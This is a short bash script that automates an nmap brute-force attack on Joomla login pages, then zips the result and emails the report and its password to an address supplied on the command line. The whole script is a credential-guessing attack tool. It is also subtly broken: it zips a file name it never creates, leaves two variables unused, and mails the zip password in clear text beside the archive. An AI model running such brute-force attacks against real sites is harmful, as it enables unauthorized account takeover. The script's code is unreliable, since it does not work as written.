#!/bin/bash
# https://hub.packtpub.com/brute-forcing-http-applications-and-web-applications-using-nmap-tutorial/
L=$1
Z=$2

# http
# change port if needed
nmap -p 443 --script http-joomla-brute -oX joombf.xml $1
xsltproc joombf.xml -o joomBrute.html

# zip
pass=$(openssl rand -base64 6)
zip --password ${pass} joomBF.zip HTTPBrute.html

# Email Report and Password
echo " Joomla Brute joomBF.zip" | mail -s "Joomla BF Report for "$1" " -A joomBF.zip $2
echo " Your password for "$1" joomBF.zip is "${pass}" " | mail -s "Your joomBF.zip Info" $2
